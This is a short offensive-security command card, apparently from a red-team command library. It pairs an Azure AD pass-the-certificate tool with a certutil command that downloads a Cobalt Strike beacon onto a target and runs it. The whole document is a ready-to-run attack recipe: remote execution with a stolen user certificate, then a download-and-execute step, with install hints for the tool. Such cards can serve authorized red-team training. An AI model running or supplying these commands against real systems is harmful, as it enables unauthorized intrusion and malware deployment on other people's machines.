---
id: f58dd063-60f4-42b3-9f82-74501684580a
name: 'Azure Cert with PSExec: certutil download and execute Cobalt Strike beacon'
type: command
executor: ''
data: AdureADJoinedMachinePTC.py --usercert <username>@<tenant>.onmicrosoft.com.pfx
  --certpass AzureADCert --remoteip $TARGET_IP --command "certutil.exe -urlcache -split
  -f http://127.0.0.1:4444/beacon.exe C:\Windows\Temp\beacon.exe & C:\Windows\Temp\beacon.exe"
output: '# Installation instructtions for the tool

  # https://github.com/morRubin/AzureADJoinedMachinePTC

  # pip3 install impacket minikerberos cryptography==3.1.1 pyasn1


  certutil.exe -urlcache -split -f http://127.0.0.1:4444/beacon.exe C:\Windows\Temp\beacon.exe
  & C:\Windows\Temp\beacon.exe'
created_at: '2023-05-25T18:50:44.625465+00:00'
updated_at: '2023-05-25T18:50:44.779119+00:00'
---

# Azure Cert with PSExec: certutil download and execute Cobalt Strike beacon

```bash
AdureADJoinedMachinePTC.py --usercert <username>@<tenant>.onmicrosoft.com.pfx --certpass AzureADCert --remoteip $TARGET_IP --command "certutil.exe -urlcache -split -f http://127.0.0.1:4444/beacon.exe C:\Windows\Temp\beacon.exe & C:\Windows\Temp\beacon.exe"
```

## Expected Output

```
# Installation instructtions for the tool
# https://github.com/morRubin/AzureADJoinedMachinePTC
# pip3 install impacket minikerberos cryptography==3.1.1 pyasn1

certutil.exe -urlcache -split -f http://127.0.0.1:4444/beacon.exe C:\Windows\Temp\beacon.exe & C:\Windows\Temp\beacon.exe
```


